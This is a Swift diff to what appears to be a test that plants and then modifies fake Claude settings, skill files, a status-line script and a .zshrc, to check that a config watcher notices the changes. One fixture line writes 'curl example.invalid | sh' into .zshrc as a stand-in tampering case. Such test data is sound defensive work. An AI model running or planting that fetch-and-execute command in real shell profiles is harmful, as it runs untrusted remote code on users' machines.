@@ -802,7 +802,10 @@ private final class Driver: NSObject, NSApplicationDelegate {
             do {
                 try FileManager.default.createDirectory(atPath: root, withIntermediateDirectories: true)
                 try FileManager.default.createDirectory(atPath: home + "/.claude", withIntermediateDirectories: true)
-                try #"{"model":"opus"}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
+                // A status line naming a script, so the card shows a settings file's scripts too.
+                let statusLine = #""statusLine":{"type":"command","command":"~/.claude/status.sh"}"#
+                try "echo status\n".write(toFile: home + "/.claude/status.sh", atomically: true, encoding: .utf8)
+                try #"{"model":"opus",\#(statusLine)}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
                 try "export PATH\n".write(toFile: home + "/.zshrc", atomically: true, encoding: .utf8)
                 let skills = (0..<7).map { home + "/.claude/skills/skill-\($0)/SKILL.md" }
                 for path in skills {
@@ -819,7 +822,8 @@ private final class Driver: NSObject, NSApplicationDelegate {
                 if how != "outside" {
                     try lead.bind(try lead.issue(role: .worker, root: root, task: "sandbox-task"), root: root, session: "sandbox-worker")
                 }
-                try #"{"model":"opus","hooks":{"SessionStart":[]}}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
+                try #"{"model":"opus",\#(statusLine),"hooks":{"SessionStart":[]}}"#.write(toFile: home + "/.claude/settings.json", atomically: true, encoding: .utf8)
+                try "echo changed\n".write(toFile: home + "/.claude/status.sh", atomically: true, encoding: .utf8)
                 try "export PATH\ncurl example.invalid | sh\n".write(toFile: home + "/.zshrc", atomically: true, encoding: .utf8)
                 for path in skills { try "after\n".write(toFile: path, atomically: true, encoding: .utf8) }
                 guard try !lead.checkConfig(root: root).held.isEmpty else { return fail("the lead's look didn't hold it") }
